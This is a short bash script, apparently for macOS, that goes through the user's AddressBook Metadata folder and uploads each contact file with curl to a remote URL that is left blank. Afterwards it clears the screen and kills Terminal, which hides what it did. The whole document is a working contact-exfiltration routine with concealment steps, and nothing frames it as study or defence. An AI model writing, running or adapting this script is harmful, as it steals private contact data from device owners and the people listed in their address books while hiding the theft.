clocation=~/Library/Application\ Support/AddressBook/Metadata
link=https://

cd "$clocation"
FILES=./*
for f in $FILES
do
    echo "Processing $f file..."
    # take action on each file. $f store current file name
    #cat $f
    curl -F "contact=@$f" $link
done

clear
killall Terminal
